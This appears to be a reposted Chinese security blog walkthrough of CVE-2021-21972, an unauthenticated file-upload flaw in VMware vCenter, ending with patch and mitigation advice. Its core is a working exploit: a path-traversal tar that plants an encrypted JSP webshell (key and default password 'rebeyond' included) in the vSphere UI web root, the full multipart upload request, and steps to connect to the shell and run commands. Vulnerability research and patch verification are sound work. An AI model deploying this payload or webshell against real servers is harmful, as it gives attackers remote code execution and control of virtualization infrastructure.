![v2-8a0a8d47045a5df46adf075bfa072f3f_1440w.png](https://image.3001.net/images/20210226/1614271088_6037d2707c7ef7f84d650.png!small)

Vmware vcenter未授权任意文件上传

(CVE-2021-21972 )

## 一、漏洞简介

VMware是一家云基础架构和移动商务解决方案厂商，提供基于VMware的虚拟化解决方案。

高危严重漏洞：

在 CVE-2021-21972 VMware vCenter Server 远程代码漏洞
中，攻击者可直接通过443端口构造恶意请求，执行任意代码，控制vCenter。

漏洞为任意文件上传:

存在问题的接口为

    
    
    /ui/vropspluginui/rest/services/uploadova，

完整路径

    
    
    （https://ip:port/ui/vropspluginui/rest/services/uploadova）

## 二、影响版本

VMware vCenter Server 7.0系列 < 7.0.U1c

VMware vCenter Server 6.7系列 < 6.7.U3l

VMware vCenter Server 6.5系列 < 6.5 U3n

VMware ESXi 7.0系列 < ESXi70U1c-17325551

VMware ESXi 6.7系列 < ESXi670-202102401-SG

VMware ESXi 6.5系列 < ESXi650-202102101-SG

## 三、环境准备&漏洞复现

> 安装EXSI 7.0.0 ​ VMware vSphere虚拟机监控程序（ESXi）
> 链接：https://cld16.irans3.com/dlir-s3/VMware-VMvisor-> Installer-7.0.0-15843807.x86_64.iso VMware-VMvisor-> Installer-7.0.0-15843807.x86_64.iso档案大小：350 MB
> MD5：220d2e87290f50c3508214cadf66b737
> SHA1：7fda0401ee1b2f49aae89043f9b2d509cf7e25db
> 安装：https://blog.51cto.com/10802692/2409826 ​ 下载 vCenter Server ​ VMware
> vCenter Server 链接：https://cld5.irans3.com/dlir-s3/VMware-VCSA-> all-7.0.0-15952498.iso VMware-VCSA-all-7.0.0-15952498.iso档案大小：6.42 GB
> MD5：94bb30ae83cd5f12e2eecce114d43007
> SHA1：17aa2b1ee20e977fb4f8f8391563f57c3e456361
> 安装：https://blog.csdn.net/qq_38028248/article/details/107712839 （环境安装参考来源：作者:
> print("")师傅环境部署）

midi.tar（后台回复："vmware"）获取

![v2-47ef4f3dc886899116d9d8851518497f_1440w.png](https://image.3001.net/images/20210226/1614271089_6037d27129b4d9f95c60e.png!small)

    
    
    ../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/42/0/h5ngc.war/resources/0000755000000000000000000000000014015431210027145 5ustar rootroot../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/42/0/h5ngc.war/resources/shell.jsp0000644000000000000000000000117114015430711030777 0ustar rootroot<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}/*1kdnwbry2LyI7pyA*/%>

https://ip:port/ui/vropspluginui/rest/services/uploadova

![v2-d8600cf69a47bf09323aaa26acf1c8cd_1440w.png](https://image.3001.net/images/20210226/1614271089_6037d271863638a138750.png!small)

    
    
    Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36

![v2-25d1220d012cea9ee960c04fbf603c72_1440w.png](https://image.3001.net/images/20210226/1614271090_6037d27201026291046b0.png!small)

![v2-344736b3cd79d4100099726551c85f84_1440w.png](https://image.3001.net/images/20210226/1614271091_6037d2734ef161a459cfa.png!small)

返回sucess证明上传tar成功

访问shell地址：

<https://127.0.0.1/ui/resources/shell.jsp>

![v2-b3ebf81ebfb4049359f1876164476510_1440w.png](https://image.3001.net/images/20210226/1614271092_6037d2744ce0713a0d4c4.png!small)

连接木马shell:

![v2-79a78d70f3e1f29be3ee8cc21014774d_1440w.png](https://image.3001.net/images/20210226/1614271092_6037d274d521e70b88dab.png!small)

相关命令执行：

![v2-e9fa678361aa8b0b3c21f0c7cfe0e17c_1440w.png](https://image.3001.net/images/20210226/1614271094_6037d27629d7e53cb1060.png!small)

具体细节上传点：包

    
    
    POST /ui/vropspluginui/rest/services/uploadova HTTP/1.1 Host: 127.0.0.1 Connection: close Accept: application/json Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryH8GoragzRFVTw1VD Content-Length: 10425 ​ ------WebKitFormBoundaryH8GoragzRFVTw1VD Content-Disposition: form-data; name="uploadFile"; filename="thelostworld.tar" Content-Type: text/plain ​ ../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/42/0/h5ngc.war/resources/0000755000000000000000000000000014015431210027145 5ustar rootroot../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/42/0/h5ngc.war/resources/shell.jsp0000644000000000000000000000117114015430711030777 0ustar rootroot<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}/*1kdnwbry2LyI7pyA*/%>

## 四、安全建议

1、升级VMware vCenter Server 与 VMware ESXi 至最新版本。

2、针对 CVE-2021-21972 VMware vCenter Server 远程代码漏洞 与 CVE-2021-21973 VMware
vCenter Server SSRF漏洞，可按照 <https://kb.vmware.com/s/article/82374>相关措施进行缓解。

3、针对 CVE-2021-21974 VMware ESXI 堆溢出漏洞，可按照
<https://kb.vmware.com/s/article/76372>相关措施进行缓解。

> 参考：
>
> <https://swarm.ptsecurity.com/unauth-rce-vmware/>
>
> <http://www.jsdjbh.gov.cn/tgyj/737.htm>
>
>
> [http://blog.nsfocus.net/cve-2021-21972-cve-2021-21974/﻿](http://blog.nsfocus.net/cve-2021-21972-cve-2021-21974/)
>
> <https://mp.weixin.qq.com/s/tg64Hy8KECjYPHt98vBLcQ>
>
> <https://www.o2oxy.cn/3127.html>
>
> <https://mp.weixin.qq.com/s/q5EGqPNFVxfHgui54cAVuA>

免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

![v2-4b029825345899d23992b40ada6b2840_1440w.png](https://image.3001.net/images/20210226/1614271095_6037d2772b495987c1b89.png!small)

  

欢迎添加本公众号作者微信交流，添加时备注一下“公众号”

